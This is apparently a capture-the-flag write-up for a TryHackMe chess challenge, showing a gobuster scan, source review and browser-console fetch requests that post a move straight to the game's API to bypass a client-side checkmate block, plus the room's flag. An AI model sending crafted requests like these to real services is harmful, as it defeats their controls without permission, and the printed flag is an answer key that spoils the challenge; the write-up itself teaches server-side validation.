# Fools Mate THM ( Try Hack Me )

> A chess game that refuses to let you checkmate. Sounds fair, right? Not when the restriction only exists on the client side.

---

## First Look

Started with a directory scan using Gobuster:

```bash
gobuster dir -u http://10.112.187.82 -w /usr/share/wordlists/dirb/common.txt -t 30 -x php,txt,html,js
```

Found a few interesting paths:

- `/index.html`
- `/js/`
- `/css/`
- `/vendor/`

The main page was an Endgame Trainer chess application. The game itself looked normal, but there was one unusual detail: it refused to allow a checkmate move.

---

## Source Code Analysis

Downloaded the main JavaScript file:

```bash
curl -s http://10.112.187.82/js/app.js
```

Found the `preMoveCheck()` function.

Its job was to simulate the player's move before sending it to the server. If the move resulted in checkmate, the function blocked it and displayed:

```text
I'll shut down your PC if you play that.
```

The important part was that this restriction happened inside the browser.

---

## API Discovery

The JavaScript revealed two API endpoints:

- `/api/reset`
- `/api/move`

First, reset the game using the browser console:

```javascript
fetch('/api/reset', {method: 'POST'})
  .then(r => r.json())
  .then(console.log)
```

The server returned:

```text
ok: true
status: ongoing
turn: w
```

The returned FEN confirmed the initial chess position.

---

## Bypassing the Restriction

Instead of making a move through the game's interface, I sent a request directly to `/api/move`.

```javascript
fetch('/api/move', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    from: 'a1',
    to: 'a8'
  })
})
.then(r => r.json())
.then(console.log)
```

The rook moved from `a1` to `a8`, delivering checkmate.

The server accepted the move and returned:

```text
ok: true
move: "a1a8"
status: "checkmate"
turn: "b"
winner: "white"
```

---

## Flag

The response included the flag:

```text
THM{cl13nt_s1d3_ch3ckm4t3}
```

---

## What I Learned

- Client-side validation can be bypassed.
- JavaScript restrictions should never be treated as security boundaries.
- API endpoints can be tested independently of the web interface.
- Important validation must happen on the server side.
---

> Author: LatenT | Date: October 2026
